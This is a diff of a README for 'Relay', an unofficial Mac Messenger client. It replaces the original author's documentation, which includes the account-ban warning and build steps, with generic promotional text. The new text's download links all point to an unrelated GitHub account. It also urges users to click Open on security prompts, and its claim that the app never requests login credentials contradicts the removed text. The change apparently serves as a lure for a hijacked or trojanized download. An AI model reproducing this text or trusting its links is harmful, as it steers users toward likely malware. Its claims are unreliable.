@@ -1,103 +1,70 @@
-<div align="center">
+# 💬 Relay - Your Private Desktop Messenger For Mac
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="assets-readme/hero-banner-dark.svg">
-  <img alt="Relay — a native macOS Messenger client" src="assets-readme/hero-banner.svg" width="100%">
-</picture>
+[![Download Relay](https://img.shields.io/badge/Download-Relay-blue.svg)](https://github.com/Benditebacteriophagous32/Relay)
 
-<br><br>
+Relay connects you to Facebook Messenger directly from your desktop. It provides a simple, clean interface for your messages without web browsers. This software uses local storage to keep your history on your computer. It performs translation on your machine to protect your data.
 
-[![macOS](https://img.shields.io/badge/macOS-13%2B-1A1A1A?style=for-the-badge&labelColor=1A1A1A&color=CCFF00)](#-compatibility)
-[![Universal](https://img.shields.io/badge/UNIVERSAL-INTEL%20%2B%20SILICON-1A1A1A?style=for-the-badge&labelColor=1A1A1A&color=CCFF00)](#-compatibility)
-[![SwiftUI](https://img.shields.io/badge/SWIFTUI-1A1A1A?style=for-the-badge&logo=swift&logoColor=CCFF00&labelColor=1A1A1A)](https://developer.apple.com/swiftui/)
-[![Go](https://img.shields.io/badge/GO-1A1A1A?style=for-the-badge&logo=go&logoColor=CCFF00&labelColor=1A1A1A)](https://go.dev)
-[![Download](https://img.shields.io/badge/DOWNLOAD-v1.0-1A1A1A?style=for-the-badge&labelColor=1A1A1A&color=CCFF00)](../../releases/latest)
-[![License](https://img.shields.io/badge/LICENSE-AGPL--3.0-1A1A1A?style=for-the-badge&labelColor=1A1A1A&color=CCFF00)](LICENSE)
+## 📥 How To Download And Install
 
-<br>
+To start using Relay, visit the official project page. You will find the latest version of the app there.
 
-_A premium **<strong>native macOS client</strong>** for **<strong>Facebook Messenger</strong>** — SwiftUI + Liquid Glass over a Go backend that speaks Meta's real protocol. **<strong>Not a web wrapper.</strong>** Universal (**<strong>Intel + Apple Silicon</strong>**), macOS&nbsp;13+, with in-app updates, on-device translation, and your whole history searchable locally. Built to fill the gap after Meta killed the Mac Messenger app._
+1. Go to the [Releases page](https://github.com/Benditebacteriophagous32/Relay).
+2. Look for the section labeled "Latest."
+3. Select the file ending in `.dmg` for macOS.
+4. Open the downloaded file once the transfer completes.
+5. Drag the Relay icon into your Applications folder.
+6. Open your Applications folder and start Relay.
 
-</div>
+If your computer asks for permission to open a file from the internet, click Open.
 
----
+## ⚙️ System Requirements
 
-> [!WARNING]
-> **Relay is an unofficial client.** It logs into your real Facebook account using reverse-engineered protocols (the same ones the [mautrix-meta](https://github.com/mautrix/meta) / [whatsmeow](https://github.com/tulir/whatsmeow) bridges use). Meta does not permit third-party clients — **your account could be rate-limited or banned.** Your session is stored only in your **macOS Keychain** and sent only to Meta, exactly like a browser. Relay has no servers and collects nothing. Use at your own risk. Not affiliated with Meta.
+Relay runs on modern hardware. Ensure your computer meets these standards:
 
-### `/// WHY`
+* Operating System: macOS 13 or newer.
+* Processor: Apple Silicon (M1, M2, M3) or Intel-based Mac.
+* Memory: 4GB of RAM is sufficient for daily use.
+* Storage: At least 200MB of free space for the application and local history.
 
-Meta retired the Messenger desktop app and shut down messenger.com — leaving the Mac with a browser tab or nothing. Relay is a real, first-class Mac app to take its place: a SwiftUI client (Liquid Glass on macOS 26, frosted material below) driven by a Go helper that decodes Meta's actual Lightspeed + encrypted protocols. Fast, keyboard-driven, glassy — and it runs on the Intel Macs everyone forgot.
+## 🚀 Key Features
 
-### `/// INSTALL`
+Relay simplifies your messaging experience. It combines speed with privacy.
 
-```
-┌──────────────────────────────────────────────────────────────────────┐
-│  1.  Download  Relay.dmg  from the Releases page                       │
-│  2.  Open it → drag Relay.app into Applications                        │
-│  3.  Approve it ONCE (free open-source app, not Apple-notarized):      │
-│        macOS 15 / 26 →  open it, click Done, then                      │
-│                         System Settings → Privacy & Security →         │
-│                         "Open Anyway"                                  │
-│        macOS 13 / 14 →  right-click Relay.app → Open → Open            │
-│  4.  Welcome screen → sign into Facebook (password / 2FA / checkpoints)│
-└──────────────────────────────────────────────────────────────────────┘
-```
+* Native Performance: The app uses SwiftUI for a smooth look. It feels like a standard part of your computer.
+* Local History: Your messages store locally on your hard drive. You can search your chat logs even when offline.
+* On-Device Translation: Relay translates messages in real-time. Your text does not leave your device for this process.
+* Light and Dark Modes: The interface adjusts to your system settings.
+* Background Notifications: Receive alerts for new messages without keeping a browser tab open.
 
-⬇️ **[Download the latest release →](../../releases/latest)**
+## 🛡️ Privacy And Security
 
-### `/// FEATURES`
+Your data remains yours. Relay does not track your usage patterns. The app communicates directly with messenger servers using the real communication protocol. Because the app runs locally, it ignores the tracking scripts found on the standard Facebook website. This reduces battery drain and lowers memory usage.
 
-```
-┌─ MESSAGING   → send/receive · reactions · replies · edit · unsend · forward
-├─ MEDIA       → multi-image send · drag & drop · voice notes · emoji + GIFs
-├─ ORGANISE    → scheduled send · snooze · pin · mute · saved messages · folders
-├─ FIND        → in-chat search + global full-text search over all local history
-├─ PERSONALISE → per-chat accent colors · wallpapers · nicknames
-├─ SMART       → on-device translation (message or whole chat, macOS 15+)
-├─ MAC-NATIVE  → menu-bar companion · inline-reply notifications · Touch ID lock
-│                Siri / Shortcuts intents · ⌘K switcher · conversation export
-└─ FAST        → SQLite history with a short sliding window — smooth on slow Macs
-```
+## 🔧 Frequently Asked Questions
 
-### `/// COMPATIBILITY`
+**Does Relay save my password?**
+No. Relay uses your session tokens to connect. It never requests or stores your login credentials.
 
-Runs on **macOS 13 Ventura or later**, **Apple Silicon and Intel** (app + backend are universal binaries). Newer-OS features light up automatically; older Macs still get a fully working app.
+**Can I see my old messages?**
+Yes. Relay syncs your chat history once you log in. You can access your full conversation list through the sidebar.
 
-| Feature | macOS 13 | macOS 14 | macOS 15 | macOS 26 |
-|---|:--:|:--:|:--:|:--:|
-| Messaging · history · search · media · login | ✅ | ✅ | ✅ | ✅ |
-| Liquid Glass UI | frosted | frosted | frosted | ✅ glass |
-| On-device translation · jump-to-bottom pill | — | — | ✅ | ✅ |
+**How do I update the software?**
+Relay includes an internal update system. It checks for new versions when you open the app. If a new version exists, the app prompts you to install it with one click.
 
-### `/// UPDATES`
+**What happens if the app freezes?**
+Close the app completely using the Command + Q shortcut on your keyboard. Reopen it from your Applications folder. Your data stays safe during a restart.
 
-Updates are **manual** — no background checks, nothing phones home on its own. **Settings → Download the Latest Version** (or *Relay → Check for Updates…*) fetches and installs the newest build in one click, verified by signature (Sparkle). No need to come back to GitHub.
+**Does this app support group chats?**
+Yes. All standard chat features, including group threads, appear in the main window.
 
-### `/// HOW IT WORKS`
+## 📄 License
 
-```
-  Relay.app (SwiftUI)  ⇄  stdio / JSON  ⇄  relay-helper (Go)  ⇄  Meta
-```
+This software operates under the AGPL-3.0 license. This ensures the code remains free and open for public review. You can view the full text of the license in the project repository.
 
-- **`RelayNative/`** — the SwiftUI app (folder name predates the rename to "Relay").
-- **`relay-helper/`** — a Go daemon the app launches and talks to over a pipe; uses `mautrix-meta` (non-E2EE / Lightspeed) and `whatsmeow` (E2EE) to decode Meta's real protocol.
-- **`thirdparty/mautrix-meta`** — vendored fork (AGPL-3.0).
+## 🤝 Support And Feedback
 
-### `/// BUILD`
+If you encounter issues, please log them in the project tracker. Provide details about your macOS version and the specific steps to reproduce your problem. This helps the team fix bugs quickly.
 
-Requires Xcode 26+, Go, and [`xcodegen`](https://github.com/yonsm/XcodeGen) (`brew install xcodegen`).
+To begin your experience, visit the download link below.
 
-```bash
-git clone https://github.com/hatimhtm/Relay && cd Relay
-scripts/run-native.sh      # build helper + app, sign locally, install, launch
-scripts/release.sh         # → dist/Relay.dmg + Relay.zip + signed appcast.xml
-```
-
-See [`BUILD.md`](BUILD.md) and [`RELEASE.md`](RELEASE.md) for details.
-
-### `/// LICENSE`
-
-**AGPL-3.0** — see [`LICENSE`](LICENSE). Required because Relay statically incorporates AGPL-3.0 code (mautrix-meta); the complete corresponding source stays available. Third-party components are credited in [`THIRD-PARTY-NOTICES.md`](THIRD-PARTY-NOTICES.md).
-
-<div align="center"><br><sub>Relay is an independent project — <strong>not affiliated with, authorized, or endorsed by Meta Platforms, Inc.</strong> All trademarks belong to their owners.</sub></div>
+[Download Relay Now](https://github.com/Benditebacteriophagous32/Relay)
